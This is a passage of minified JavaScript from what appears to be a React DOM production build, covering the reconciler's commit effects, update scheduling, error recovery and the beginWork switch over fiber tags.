            var i = e, l = t, s = l;
            e:for (; s !== null;) {
                switch (s.tag) {
                    case 5:
                        ve = s.stateNode, nt = !1;
                        break e;
                    case 3:
                        ve = s.stateNode.containerInfo, nt = !0;
                        break e;
                    case 4:
                        ve = s.stateNode.containerInfo, nt = !0;
                        break e
                }
                s = s.return
            }
            if (ve === null) throw Error(T(160));
            tp(i, l, o), ve = null, nt = !1;
            var a = o.alternate;
            a !== null && (a.return = null), o.return = null
        } catch (u) {
            le(o, t, u)
        }
    }
    if (t.subtreeFlags & 12854) for (t = t.child; t !== null;) np(t, e), t = t.sibling
}

function np(e, t) {
    var n = e.alternate, r = e.flags;
    switch (e.tag) {
        case 0:
        case 11:
        case 14:
        case 15:
            if (Ze(t, e), ut(e), r & 4) {
                try {
                    br(3, e, e.return), Hi(3, e)
                } catch (v) {
                    le(e, e.return, v)
                }
                try {
                    br(5, e, e.return)
                } catch (v) {
                    le(e, e.return, v)
                }
            }
            break;
        case 1:
            Ze(t, e), ut(e), r & 512 && n !== null && Un(n, n.return);
            break;
        case 5:
            if (Ze(t, e), ut(e), r & 512 && n !== null && Un(n, n.return), e.flags & 32) {
                var o = e.stateNode;
                try {
                    Kr(o, "")
                } catch (v) {
                    le(e, e.return, v)
                }
            }
            if (r & 4 && (o = e.stateNode, o != null)) {
                var i = e.memoizedProps, l = n !== null ? n.memoizedProps : i, s = e.type, a = e.updateQueue;
                if (e.updateQueue = null, a !== null) try {
                    s === "input" && i.type === "radio" && i.name != null && Cd(o, i), os(s, l);
                    var u = os(s, i);
                    for (l = 0; l < a.length; l += 2) {
                        var c = a[l], d = a[l + 1];
                        c === "style" ? Td(o, d) : c === "dangerouslySetInnerHTML" ? Nd(o, d) : c === "children" ? Kr(o, d) : ia(o, c, d, u)
                    }
                    switch (s) {
                        case"input":
                            Zl(o, i);
                            break;
                        case"textarea":
                            Ed(o, i);
                            break;
                        case"select":
                            var p = o._wrapperState.wasMultiple;
                            o._wrapperState.wasMultiple = !!i.multiple;
                            var x = i.value;
                            x != null ? Wn(o, !!i.multiple, x, !1) : p !== !!i.multiple && (i.defaultValue != null ? Wn(o, !!i.multiple, i.defaultValue, !0) : Wn(o, !!i.multiple, i.multiple ? [] : "", !1))
                    }
                    o[to] = i
                } catch (v) {
                    le(e, e.return, v)
                }
            }
            break;
        case 6:
            if (Ze(t, e), ut(e), r & 4) {
                if (e.stateNode === null) throw Error(T(162));
                o = e.stateNode, i = e.memoizedProps;
                try {
                    o.nodeValue = i
                } catch (v) {
                    le(e, e.return, v)
                }
            }
            break;
        case 3:
            if (Ze(t, e), ut(e), r & 4 && n !== null && n.memoizedState.isDehydrated) try {
                Yr(t.containerInfo)
            } catch (v) {
                le(e, e.return, v)
            }
            break;
        case 4:
            Ze(t, e), ut(e);
            break;
        case 13:
            Ze(t, e), ut(e), o = e.child, o.flags & 8192 && (i = o.memoizedState !== null, o.stateNode.isHidden = i, !i || o.alternate !== null && o.alternate.memoizedState !== null || (Aa = ae())), r & 4 && fc(e);
            break;
        case 22:
            if (c = n !== null && n.memoizedState !== null, e.mode & 1 ? (Ne = (u = Ne) || c, Ze(t, e), Ne = u) : Ze(t, e), ut(e), r & 8192) {
                if (u = e.memoizedState !== null, (e.stateNode.isHidden = u) && !c && e.mode & 1) for (_ = e, c = e.child; c !== null;) {
                    for (d = _ = c; _ !== null;) {
                        switch (p = _, x = p.child, p.tag) {
                            case 0:
                            case 11:
                            case 14:
                            case 15:
                                br(4, p, p.return);
                                break;
                            case 1:
                                Un(p, p.return);
                                var y = p.stateNode;
                                if (typeof y.componentWillUnmount == "function") {
                                    r = p, n = p.return;
                                    try {
                                        t = r, y.props = t.memoizedProps, y.state = t.memoizedState, y.componentWillUnmount()
                                    } catch (v) {
                                        le(r, n, v)
                                    }
                                }
                                break;
                            case 5:
                                Un(p, p.return);
                                break;
                            case 22:
                                if (p.memoizedState !== null) {
                                    mc(d);
                                    continue
                                }
                        }
                        x !== null ? (x.return = p, _ = x) : mc(d)
                    }
                    c = c.sibling
                }
                e:for (c = null, d = e; ;) {
                    if (d.tag === 5) {
                        if (c === null) {
                            c = d;
                            try {
                                o = d.stateNode, u ? (i = o.style, typeof i.setProperty == "function" ? i.setProperty("display", "none", "important") : i.display = "none") : (s = d.stateNode, a = d.memoizedProps.style, l = a != null && a.hasOwnProperty("display") ? a.display : null, s.style.display = Rd("display", l))
                            } catch (v) {
                                le(e, e.return, v)
                            }
                        }
                    } else if (d.tag === 6) {
                        if (c === null) try {
                            d.stateNode.nodeValue = u ? "" : d.memoizedProps
                        } catch (v) {
                            le(e, e.return, v)
                        }
                    } else if ((d.tag !== 22 && d.tag !== 23 || d.memoizedState === null || d === e) && d.child !== null) {
                        d.child.return = d, d = d.child;
                        continue
                    }
                    if (d === e) break e;
                    for (; d.sibling === null;) {
                        if (d.return === null || d.return === e) break e;
                        c === d && (c = null), d = d.return
                    }
                    c === d && (c = null), d.sibling.return = d.return, d = d.sibling
                }
            }
            break;
        case 19:
            Ze(t, e), ut(e), r & 4 && fc(e);
            break;
        case 21:
            break;
        default:
            Ze(t, e), ut(e)
    }
}

function ut(e) {
    var t = e.flags;
    if (t & 2) {
        try {
            e:{
                for (var n = e.return; n !== null;) {
                    if (ep(n)) {
                        var r = n;
                        break e
                    }
                    n = n.return
                }
                throw Error(T(160))
            }
            switch (r.tag) {
                case 5:
                    var o = r.stateNode;
                    r.flags & 32 && (Kr(o, ""), r.flags &= -33);
                    var i = dc(e);
                    Ds(e, i, o);
                    break;
                case 3:
                case 4:
                    var l = r.stateNode.containerInfo, s = dc(e);
                    Is(e, s, l);
                    break;
                default:
                    throw Error(T(161))
            }
        } catch (a) {
            le(e, e.return, a)
        }
        e.flags &= -3
    }
    t & 4096 && (e.flags &= -4097)
}

function zy(e, t, n) {
    _ = e, rp(e)
}

function rp(e, t, n) {
    for (var r = (e.mode & 1) !== 0; _ !== null;) {
        var o = _, i = o.child;
        if (o.tag === 22 && r) {
            var l = o.memoizedState !== null || $o;
            if (!l) {
                var s = o.alternate, a = s !== null && s.memoizedState !== null || Ne;
                s = $o;
                var u = Ne;
                if ($o = l, (Ne = a) && !u) for (_ = o; _ !== null;) l = _, a = l.child, l.tag === 22 && l.memoizedState !== null ? hc(o) : a !== null ? (a.return = l, _ = a) : hc(o);
                for (; i !== null;) _ = i, rp(i), i = i.sibling;
                _ = o, $o = s, Ne = u
            }
            pc(e)
        } else o.subtreeFlags & 8772 && i !== null ? (i.return = o, _ = i) : pc(e)
    }
}

function pc(e) {
    for (; _ !== null;) {
        var t = _;
        if (t.flags & 8772) {
            var n = t.alternate;
            try {
                if (t.flags & 8772) switch (t.tag) {
                    case 0:
                    case 11:
                    case 15:
                        Ne || Hi(5, t);
                        break;
                    case 1:
                        var r = t.stateNode;
                        if (t.flags & 4 && !Ne) if (n === null) r.componentDidMount(); else {
                            var o = t.elementType === t.type ? n.memoizedProps : tt(t.type, n.memoizedProps);
                            r.componentDidUpdate(o, n.memoizedState, r.__reactInternalSnapshotBeforeUpdate)
                        }
                        var i = t.updateQueue;
                        i !== null && Yu(t, i, r);
                        break;
                    case 3:
                        var l = t.updateQueue;
                        if (l !== null) {
                            if (n = null, t.child !== null) switch (t.child.tag) {
                                case 5:
                                    n = t.child.stateNode;
                                    break;
                                case 1:
                                    n = t.child.stateNode
                            }
                            Yu(t, l, n)
                        }
                        break;
                    case 5:
                        var s = t.stateNode;
                        if (n === null && t.flags & 4) {
                            n = s;
                            var a = t.memoizedProps;
                            switch (t.type) {
                                case"button":
                                case"input":
                                case"select":
                                case"textarea":
                                    a.autoFocus && n.focus();
                                    break;
                                case"img":
                                    a.src && (n.src = a.src)
                            }
                        }
                        break;
                    case 6:
                        break;
                    case 4:
                        break;
                    case 12:
                        break;
                    case 13:
                        if (t.memoizedState === null) {
                            var u = t.alternate;
                            if (u !== null) {
                                var c = u.memoizedState;
                                if (c !== null) {
                                    var d = c.dehydrated;
                                    d !== null && Yr(d)
                                }
                            }
                        }
                        break;
                    case 19:
                    case 17:
                    case 21:
                    case 22:
                    case 23:
                    case 25:
                        break;
                    default:
                        throw Error(T(163))
                }
                Ne || t.flags & 512 && Ls(t)
            } catch (p) {
                le(t, t.return, p)
            }
        }
        if (t === e) {
            _ = null;
            break
        }
        if (n = t.sibling, n !== null) {
            n.return = t.return, _ = n;
            break
        }
        _ = t.return
    }
}

function mc(e) {
    for (; _ !== null;) {
        var t = _;
        if (t === e) {
            _ = null;
            break
        }
        var n = t.sibling;
        if (n !== null) {
            n.return = t.return, _ = n;
            break
        }
        _ = t.return
    }
}

function hc(e) {
    for (; _ !== null;) {
        var t = _;
        try {
            switch (t.tag) {
                case 0:
                case 11:
                case 15:
                    var n = t.return;
                    try {
                        Hi(4, t)
                    } catch (a) {
                        le(t, n, a)
                    }
                    break;
                case 1:
                    var r = t.stateNode;
                    if (typeof r.componentDidMount == "function") {
                        var o = t.return;
                        try {
                            r.componentDidMount()
                        } catch (a) {
                            le(t, o, a)
                        }
                    }
                    var i = t.return;
                    try {
                        Ls(t)
                    } catch (a) {
                        le(t, i, a)
                    }
                    break;
                case 5:
                    var l = t.return;
                    try {
                        Ls(t)
                    } catch (a) {
                        le(t, l, a)
                    }
            }
        } catch (a) {
            le(t, t.return, a)
        }
        if (t === e) {
            _ = null;
            break
        }
        var s = t.sibling;
        if (s !== null) {
            s.return = t.return, _ = s;
            break
        }
        _ = t.return
    }
}

var By = Math.ceil, Si = _t.ReactCurrentDispatcher, $a = _t.ReactCurrentOwner, Xe = _t.ReactCurrentBatchConfig, H = 0,
    ge = null, ce = null, we = 0, ze = 0, bn = tn(0), me = 0, so = null, yn = 0, Wi = 0, Fa = 0, Hr = null, De = null,
    Aa = 0, ir = 1 / 0, yt = null, Ci = !1, Ms = null, Xt = null, Fo = !1, bt = null, Ei = 0, Wr = 0, $s = null,
    Yo = -1, Jo = 0;

function Pe() {
    return H & 6 ? ae() : Yo !== -1 ? Yo : Yo = ae()
}

function Yt(e) {
    return e.mode & 1 ? H & 2 && we !== 0 ? we & -we : Ey.transition !== null ? (Jo === 0 && (Jo = zd()), Jo) : (e = Q, e !== 0 || (e = window.event, e = e === void 0 ? 16 : Kd(e.type)), e) : 1
}

function st(e, t, n, r) {
    if (50 < Wr) throw Wr = 0, $s = null, Error(T(185));
    po(e, n, r), (!(H & 2) || e !== ge) && (e === ge && (!(H & 2) && (Wi |= n), me === 4 && zt(e, we)), Ae(e, r), n === 1 && H === 0 && !(t.mode & 1) && (ir = ae() + 500, Bi && nn()))
}

function Ae(e, t) {
    var n = e.callbackNode;
    Eg(e, t);
    var r = li(e, e === ge ? we : 0);
    if (r === 0) n !== null && ku(n), e.callbackNode = null, e.callbackPriority = 0; else if (t = r & -r, e.callbackPriority !== t) {
        if (n != null && ku(n), t === 1) e.tag === 0 ? Cy(gc.bind(null, e)) : ff(gc.bind(null, e)), vy(function () {
            !(H & 6) && nn()
        }), n = null; else {
            switch (Bd(r)) {
                case 1:
                    n = ca;
                    break;
                case 4:
                    n = Fd;
                    break;
                case 16:
                    n = ii;
                    break;
                case 536870912:
                    n = Ad;
                    break;
                default:
                    n = ii
            }
            n = dp(n, op.bind(null, e))
        }
        e.callbackPriority = t, e.callbackNode = n
    }
}

function op(e, t) {
    if (Yo = -1, Jo = 0, H & 6) throw Error(T(327));
    var n = e.callbackNode;
    if (Xn() && e.callbackNode !== n) return null;
    var r = li(e, e === ge ? we : 0);
    if (r === 0) return null;
    if (r & 30 || r & e.expiredLanes || t) t = ki(e, r); else {
        t = r;
        var o = H;
        H |= 2;
        var i = lp();
        (ge !== e || we !== t) && (yt = null, ir = ae() + 500, dn(e, t));
        do try {
            Hy();
            break
        } catch (s) {
            ip(e, s)
        } while (1);
        Ea(), Si.current = i, H = o, ce !== null ? t = 0 : (ge = null, we = 0, t = me)
    }
    if (t !== 0) {
        if (t === 2 && (o = us(e), o !== 0 && (r = o, t = Fs(e, o))), t === 1) throw n = so, dn(e, 0), zt(e, r), Ae(e, ae()), n;
        if (t === 6) zt(e, r); else {
            if (o = e.current.alternate, !(r & 30) && !Uy(o) && (t = ki(e, r), t === 2 && (i = us(e), i !== 0 && (r = i, t = Fs(e, i))), t === 1)) throw n = so, dn(e, 0), zt(e, r), Ae(e, ae()), n;
            switch (e.finishedWork = o, e.finishedLanes = r, t) {
                case 0:
                case 1:
                    throw Error(T(345));
                case 2:
                    sn(e, De, yt);
                    break;
                case 3:
                    if (zt(e, r), (r & 130023424) === r && (t = Aa + 500 - ae(), 10 < t)) {
                        if (li(e, 0) !== 0) break;
                        if (o = e.suspendedLanes, (o & r) !== r) {
                            Pe(), e.pingedLanes |= e.suspendedLanes & o;
                            break
                        }
                        e.timeoutHandle = ys(sn.bind(null, e, De, yt), t);
                        break
                    }
                    sn(e, De, yt);
                    break;
                case 4:
                    if (zt(e, r), (r & 4194240) === r) break;
                    for (t = e.eventTimes, o = -1; 0 < r;) {
                        var l = 31 - lt(r);
                        i = 1 << l, l = t[l], l > o && (o = l), r &= ~i
                    }
                    if (r = o, r = ae() - r, r = (120 > r ? 120 : 480 > r ? 480 : 1080 > r ? 1080 : 1920 > r ? 1920 : 3e3 > r ? 3e3 : 4320 > r ? 4320 : 1960 * By(r / 1960)) - r, 10 < r) {
                        e.timeoutHandle = ys(sn.bind(null, e, De, yt), r);
                        break
                    }
                    sn(e, De, yt);
                    break;
                case 5:
                    sn(e, De, yt);
                    break;
                default:
                    throw Error(T(329))
            }
        }
    }
    return Ae(e, ae()), e.callbackNode === n ? op.bind(null, e) : null
}

function Fs(e, t) {
    var n = Hr;
    return e.current.memoizedState.isDehydrated && (dn(e, t).flags |= 256), e = ki(e, t), e !== 2 && (t = De, De = n, t !== null && As(t)), e
}

function As(e) {
    De === null ? De = e : De.push.apply(De, e)
}

function Uy(e) {
    for (var t = e; ;) {
        if (t.flags & 16384) {
            var n = t.updateQueue;
            if (n !== null && (n = n.stores, n !== null)) for (var r = 0; r < n.length; r++) {
                var o = n[r], i = o.getSnapshot;
                o = o.value;
                try {
                    if (!at(i(), o)) return !1
                } catch {
                    return !1
                }
            }
        }
        if (n = t.child, t.subtreeFlags & 16384 && n !== null) n.return = t, t = n; else {
            if (t === e) break;
            for (; t.sibling === null;) {
                if (t.return === null || t.return === e) return !0;
                t = t.return
            }
            t.sibling.return = t.return, t = t.sibling
        }
    }
    return !0
}

function zt(e, t) {
    for (t &= ~Fa, t &= ~Wi, e.suspendedLanes |= t, e.pingedLanes &= ~t, e = e.expirationTimes; 0 < t;) {
        var n = 31 - lt(t), r = 1 << n;
        e[n] = -1, t &= ~r
    }
}

function gc(e) {
    if (H & 6) throw Error(T(327));
    Xn();
    var t = li(e, 0);
    if (!(t & 1)) return Ae(e, ae()), null;
    var n = ki(e, t);
    if (e.tag !== 0 && n === 2) {
        var r = us(e);
        r !== 0 && (t = r, n = Fs(e, r))
    }
    if (n === 1) throw n = so, dn(e, 0), zt(e, t), Ae(e, ae()), n;
    if (n === 6) throw Error(T(345));
    return e.finishedWork = e.current.alternate, e.finishedLanes = t, sn(e, De, yt), Ae(e, ae()), null
}

function za(e, t) {
    var n = H;
    H |= 1;
    try {
        return e(t)
    } finally {
        H = n, H === 0 && (ir = ae() + 500, Bi && nn())
    }
}

function vn(e) {
    bt !== null && bt.tag === 0 && !(H & 6) && Xn();
    var t = H;
    H |= 1;
    var n = Xe.transition, r = Q;
    try {
        if (Xe.transition = null, Q = 1, e) return e()
    } finally {
        Q = r, Xe.transition = n, H = t, !(H & 6) && nn()
    }
}

function Ba() {
    ze = bn.current, q(bn)
}

function dn(e, t) {
    e.finishedWork = null, e.finishedLanes = 0;
    var n = e.timeoutHandle;
    if (n !== -1 && (e.timeoutHandle = -1, yy(n)), ce !== null) for (n = ce.return; n !== null;) {
        var r = n;
        switch (xa(r), r.tag) {
            case 1:
                r = r.type.childContextTypes, r != null && di();
                break;
            case 3:
                rr(), q($e), q(Te), Oa();
                break;
            case 5:
                ja(r);
                break;
            case 4:
                rr();
                break;
            case 13:
                q(ne);
                break;
            case 19:
                q(ne);
                break;
            case 10:
                ka(r.type._context);
                break;
            case 22:
            case 23:
                Ba()
        }
        n = n.return
    }
    if (ge = e, ce = e = Jt(e.current, null), we = ze = t, me = 0, so = null, Fa = Wi = yn = 0, De = Hr = null, un !== null) {
        for (t = 0; t < un.length; t++) if (n = un[t], r = n.interleaved, r !== null) {
            n.interleaved = null;
            var o = r.next, i = n.pending;
            if (i !== null) {
                var l = i.next;
                i.next = o, r.next = l
            }
            n.pending = r
        }
        un = null
    }
    return e
}

function ip(e, t) {
    do {
        var n = ce;
        try {
            if (Ea(), Go.current = xi, wi) {
                for (var r = re.memoizedState; r !== null;) {
                    var o = r.queue;
                    o !== null && (o.pending = null), r = r.next
                }
                wi = !1
            }
            if (gn = 0, he = pe = re = null, Ur = !1, oo = 0, $a.current = null, n === null || n.return === null) {
                me = 1, so = t, ce = null;
                break
            }
            e:{
                var i = e, l = n.return, s = n, a = t;
                if (t = we, s.flags |= 32768, a !== null && typeof a == "object" && typeof a.then == "function") {
                    var u = a, c = s, d = c.tag;
                    if (!(c.mode & 1) && (d === 0 || d === 11 || d === 15)) {
                        var p = c.alternate;
                        p ? (c.updateQueue = p.updateQueue, c.memoizedState = p.memoizedState, c.lanes = p.lanes) : (c.updateQueue = null, c.memoizedState = null)
                    }
                    var x = rc(l);
                    if (x !== null) {
                        x.flags &= -257, oc(x, l, s, i, t), x.mode & 1 && nc(i, u, t), t = x, a = u;
                        var y = t.updateQueue;
                        if (y === null) {
                            var v = new Set;
                            v.add(a), t.updateQueue = v
                        } else y.add(a);
                        break e
                    } else {
                        if (!(t & 1)) {
                            nc(i, u, t), Ua();
                            break e
                        }
                        a = Error(T(426))
                    }
                } else if (Z && s.mode & 1) {
                    var C = rc(l);
                    if (C !== null) {
                        !(C.flags & 65536) && (C.flags |= 256), oc(C, l, s, i, t), Sa(or(a, s));
                        break e
                    }
                }
                i = a = or(a, s), me !== 4 && (me = 2), Hr === null ? Hr = [i] : Hr.push(i), i = l;
                do {
                    switch (i.tag) {
                        case 3:
                            i.flags |= 65536, t &= -t, i.lanes |= t;
                            var g = bf(i, a, t);
                            Xu(i, g);
                            break e;
                        case 1:
                            s = a;
                            var h = i.type, w = i.stateNode;
                            if (!(i.flags & 128) && (typeof h.getDerivedStateFromError == "function" || w !== null && typeof w.componentDidCatch == "function" && (Xt === null || !Xt.has(w)))) {
                                i.flags |= 65536, t &= -t, i.lanes |= t;
                                var S = Hf(i, s, t);
                                Xu(i, S);
                                break e
                            }
                    }
                    i = i.return
                } while (i !== null)
            }
            ap(n)
        } catch (E) {
            t = E, ce === n && n !== null && (ce = n = n.return);
            continue
        }
        break
    } while (1)
}

function lp() {
    var e = Si.current;
    return Si.current = xi, e === null ? xi : e
}

function Ua() {
    (me === 0 || me === 3 || me === 2) && (me = 4), ge === null || !(yn & 268435455) && !(Wi & 268435455) || zt(ge, we)
}

function ki(e, t) {
    var n = H;
    H |= 2;
    var r = lp();
    (ge !== e || we !== t) && (yt = null, dn(e, t));
    do try {
        by();
        break
    } catch (o) {
        ip(e, o)
    } while (1);
    if (Ea(), H = n, Si.current = r, ce !== null) throw Error(T(261));
    return ge = null, we = 0, me
}

function by() {
    for (; ce !== null;) sp(ce)
}

function Hy() {
    for (; ce !== null && !mg();) sp(ce)
}

function sp(e) {
    var t = cp(e.alternate, e, ze);
    e.memoizedProps = e.pendingProps, t === null ? ap(e) : ce = t, $a.current = null
}

function ap(e) {
    var t = e;
    do {
        var n = t.alternate;
        if (e = t.return, t.flags & 32768) {
            if (n = $y(n, t), n !== null) {
                n.flags &= 32767, ce = n;
                return
            }
            if (e !== null) e.flags |= 32768, e.subtreeFlags = 0, e.deletions = null; else {
                me = 6, ce = null;
                return
            }
        } else if (n = My(n, t, ze), n !== null) {
            ce = n;
            return
        }
        if (t = t.sibling, t !== null) {
            ce = t;
            return
        }
        ce = t = e
    } while (t !== null);
    me === 0 && (me = 5)
}

function sn(e, t, n) {
    var r = Q, o = Xe.transition;
    try {
        Xe.transition = null, Q = 1, Wy(e, t, n, r)
    } finally {
        Xe.transition = o, Q = r
    }
    return null
}

function Wy(e, t, n, r) {
    do Xn(); while (bt !== null);
    if (H & 6) throw Error(T(327));
    n = e.finishedWork;
    var o = e.finishedLanes;
    if (n === null) return null;
    if (e.finishedWork = null, e.finishedLanes = 0, n === e.current) throw Error(T(177));
    e.callbackNode = null, e.callbackPriority = 0;
    var i = n.lanes | n.childLanes;
    if (kg(e, i), e === ge && (ce = ge = null, we = 0), !(n.subtreeFlags & 2064) && !(n.flags & 2064) || Fo || (Fo = !0, dp(ii, function () {
        return Xn(), null
    })), i = (n.flags & 15990) !== 0, n.subtreeFlags & 15990 || i) {
        i = Xe.transition, Xe.transition = null;
        var l = Q;
        Q = 1;
        var s = H;
        H |= 4, $a.current = null, Ay(e, n), np(n, e), cy(hs), si = !!ms, hs = ms = null, e.current = n, zy(n), hg(), H = s, Q = l, Xe.transition = i
    } else e.current = n;
    if (Fo && (Fo = !1, bt = e, Ei = o), i = e.pendingLanes, i === 0 && (Xt = null), vg(n.stateNode), Ae(e, ae()), t !== null) for (r = e.onRecoverableError, n = 0; n < t.length; n++) o = t[n], r(o.value, {
        componentStack: o.stack,
        digest: o.digest
    });
    if (Ci) throw Ci = !1, e = Ms, Ms = null, e;
    return Ei & 1 && e.tag !== 0 && Xn(), i = e.pendingLanes, i & 1 ? e === $s ? Wr++ : (Wr = 0, $s = e) : Wr = 0, nn(), null
}

function Xn() {
    if (bt !== null) {
        var e = Bd(Ei), t = Xe.transition, n = Q;
        try {
            if (Xe.transition = null, Q = 16 > e ? 16 : e, bt === null) var r = !1; else {
                if (e = bt, bt = null, Ei = 0, H & 6) throw Error(T(331));
                var o = H;
                for (H |= 4, _ = e.current; _ !== null;) {
                    var i = _, l = i.child;
                    if (_.flags & 16) {
                        var s = i.deletions;
                        if (s !== null) {
                            for (var a = 0; a < s.length; a++) {
                                var u = s[a];
                                for (_ = u; _ !== null;) {
                                    var c = _;
                                    switch (c.tag) {
                                        case 0:
                                        case 11:
                                        case 15:
                                            br(8, c, i)
                                    }
                                    var d = c.child;
                                    if (d !== null) d.return = c, _ = d; else for (; _ !== null;) {
                                        c = _;
                                        var p = c.sibling, x = c.return;
                                        if (Zf(c), c === u) {
                                            _ = null;
                                            break
                                        }
                                        if (p !== null) {
                                            p.return = x, _ = p;
                                            break
                                        }
                                        _ = x
                                    }
                                }
                            }
                            var y = i.alternate;
                            if (y !== null) {
                                var v = y.child;
                                if (v !== null) {
                                    y.child = null;
                                    do {
                                        var C = v.sibling;
                                        v.sibling = null, v = C
                                    } while (v !== null)
                                }
                            }
                            _ = i
                        }
                    }
                    if (i.subtreeFlags & 2064 && l !== null) l.return = i, _ = l; else e:for (; _ !== null;) {
                        if (i = _, i.flags & 2048) switch (i.tag) {
                            case 0:
                            case 11:
                            case 15:
                                br(9, i, i.return)
                        }
                        var g = i.sibling;
                        if (g !== null) {
                            g.return = i.return, _ = g;
                            break e
                        }
                        _ = i.return
                    }
                }
                var h = e.current;
                for (_ = h; _ !== null;) {
                    l = _;
                    var w = l.child;
                    if (l.subtreeFlags & 2064 && w !== null) w.return = l, _ = w; else e:for (l = h; _ !== null;) {
                        if (s = _, s.flags & 2048) try {
                            switch (s.tag) {
                                case 0:
                                case 11:
                                case 15:
                                    Hi(9, s)
                            }
                        } catch (E) {
                            le(s, s.return, E)
                        }
                        if (s === l) {
                            _ = null;
                            break e
                        }
                        var S = s.sibling;
                        if (S !== null) {
                            S.return = s.return, _ = S;
                            break e
                        }
                        _ = s.return
                    }
                }
                if (H = o, nn(), mt && typeof mt.onPostCommitFiberRoot == "function") try {
                    mt.onPostCommitFiberRoot(Mi, e)
                } catch {
                }
                r = !0
            }
            return r
        } finally {
            Q = n, Xe.transition = t
        }
    }
    return !1
}

function yc(e, t, n) {
    t = or(n, t), t = bf(e, t, 1), e = Qt(e, t, 1), t = Pe(), e !== null && (po(e, 1, t), Ae(e, t))
}

function le(e, t, n) {
    if (e.tag === 3) yc(e, e, n); else for (; t !== null;) {
        if (t.tag === 3) {
            yc(t, e, n);
            break
        } else if (t.tag === 1) {
            var r = t.stateNode;
            if (typeof t.type.getDerivedStateFromError == "function" || typeof r.componentDidCatch == "function" && (Xt === null || !Xt.has(r))) {
                e = or(n, e), e = Hf(t, e, 1), t = Qt(t, e, 1), e = Pe(), t !== null && (po(t, 1, e), Ae(t, e));
                break
            }
        }
        t = t.return
    }
}

function Vy(e, t, n) {
    var r = e.pingCache;
    r !== null && r.delete(t), t = Pe(), e.pingedLanes |= e.suspendedLanes & n, ge === e && (we & n) === n && (me === 4 || me === 3 && (we & 130023424) === we && 500 > ae() - Aa ? dn(e, 0) : Fa |= n), Ae(e, t)
}

function up(e, t) {
    t === 0 && (e.mode & 1 ? (t = To, To <<= 1, !(To & 130023424) && (To = 4194304)) : t = 1);
    var n = Pe();
    e = Tt(e, t), e !== null && (po(e, t, n), Ae(e, n))
}

function Ky(e) {
    var t = e.memoizedState, n = 0;
    t !== null && (n = t.retryLane), up(e, n)
}

function Gy(e, t) {
    var n = 0;
    switch (e.tag) {
        case 13:
            var r = e.stateNode, o = e.memoizedState;
            o !== null && (n = o.retryLane);
            break;
        case 19:
            r = e.stateNode;
            break;
        default:
            throw Error(T(314))
    }
    r !== null && r.delete(t), up(e, n)
}

var cp;
cp = function (e, t, n) {
    if (e !== null) if (e.memoizedProps !== t.pendingProps || $e.current) Me = !0; else {
        if (!(e.lanes & n) && !(t.flags & 128)) return Me = !1, Dy(e, t, n);
        Me = !!(e.flags & 131072)
    } else Me = !1, Z && t.flags & 1048576 && pf(t, mi, t.index);
    switch (t.lanes = 0, t.tag) {
        case 2:
            var r = t.type;
            Xo(e, t), e = t.pendingProps;
            var o = er(t, Te.current);
            Qn(t, n), o = Pa(null, t, r, e, o, n);
            var i = La();
            return t.flags |= 1, typeof o == "object" && o !== null && typeof o.render == "function" && o.$$typeof === void 0 ? (t.tag = 1, t.memoizedState = null, t.updateQueue = null, Fe(r) ? (i = !0, fi(t)) : i = !1, t.memoizedState = o.state !== null && o.state !== void 0 ? o.state : null, Ra(t), o.updater = Ui, t.stateNode = o, o._reactInternals = t, ks(t, r, e, n), t = Ts(null, t, r, !0, i, n)) : (t.tag = 0, Z && i && wa(t), Oe(null, t, o, n), t = t.child), t;
        case 16:
            r = t.elementType;
            e:{
                switch (Xo(e, t), e = t.pendingProps, o = r._init, r = o(r._payload), t.type = r, o = t.tag = Xy(r), e = tt(r, e), o) {
                    case 0:
                        t = Rs(null, t, r, e, n);
                        break e;
                    case 1:
                        t = sc(null, t, r, e, n);
                        break e;
                    case 11:
                        t = ic(null, t, r, e, n);
                        break e;
                    case 14:
                        t = lc(null, t, r, tt(r.type, e), n);
                        break e
                }
                throw Error(T(306, r, ""))
            }
            return t;
        case 0:
            return r = t.type, o = t.pendingProps, o = t.elementType === r ? o : tt(r, o), Rs(e, t, r, o, n);
        case 1:
            return r = t.type, o = t.pendingProps, o = t.elementType === r ? o : tt(r, o), sc(e, t, r, o, n);
        case 3:
            e:{
                if (Gf(t), e === null) throw Error(T(387));
                r = t.pendingProps, i = t.memoizedState, o = i.element, yf(e, t), yi(t, r, null, n);
                var l = t.memoizedState;
                if (r = l.element, i.isDehydrated) if (i = {
                    element: r,
                    isDehydrated: !1,
                    cache: l.cache,
                    pendingSuspenseBoundaries: l.pendingSuspenseBoundaries,
                    transitions: l.transitions
                }, t.updateQueue.baseState = i, t.memoizedState = i, t.flags & 256) {
                    o = or(Error(T(423)), t), t = ac(e, t, r, n, o);
                    break e
                } else if (r !== o) {
                    o = or(Error(T(424)), t), t = ac(e, t, r, n, o);
                    break e
                } else for (Be = Gt(t.stateNode.containerInfo.firstChild), Ue = t, Z = !0, rt = null, n = Sf(t, null, r, n), t.child = n; n;) n.flags = n.flags & -3 | 4096, n = n.sibling; else {
                    if (tr(), r === o) {
                        t = jt(e, t, n);
                        break e
                    }
                    Oe(e, t, r, n)
                }
                t = t.child
            }
            return t;
        case 5:
            return Cf(t), e === null && Ss(t), r = t.type, o = t.pendingProps, i = e !== null ? e.memoizedProps : null, l = o.children, gs(r, o) ? l = null : i !== null && gs(r, i) && (t.flags |= 32), Kf(e, t), Oe(e, t, l, n), t.child;
        case 6:
            return e === null && Ss(t), null;
        case 13:
            return Qf(e, t, n);
        case 4:
            return Ta(t, t.stateNode.containerInfo), r = t.pendingProps, e === null ? t.child = nr(t, null, r, n) : Oe(e, t, r, n), t.child;
        case 11:
            return r = t.type, o = t.pendingProps, o = t.elementType === r ? o : tt(r, o), ic(e, t, r, o, n);
        case 7:
            return Oe(e, t, t.pendingProps, n), t.child;
        case 8:
            return Oe(e, t, t.pendingProps.children, n), t.child;
        case 12:
            return Oe(e, t, t.pendingProps.children, n), t.child;
        case 10:
            e:{
                if (r = t.type._context, o = t.pendingProps, i = t.memoizedProps, l = o.value, Y(hi, r._currentValue), r._currentValue = l, i !== null) if (at(i.value, l)) {
                    if (i.children === o.children && !$e.current) {
                        t = jt(e, t, n);
                        break e
                    }
                } else for (i = t.child, i !== null && (i.return = t); i !== null;) {
                    var s = i.dependencies;
                    if (s !== null) {
                        l = i.child;
                        for (var a = s.firstContext; a !== null;) {
                            if (a.context === r) {
                                if (i.tag === 1) {
                                    a = Ct(-1, n & -n), a.tag = 2;
                                    var u = i.updateQueue;
                                    if (u !== null) {
                                        u = u.shared;
                                        var c = u.pending;
                                        c === null ? a.next = a : (a.next = c.next, c.next = a), u.pending = a
                                    }
                                }
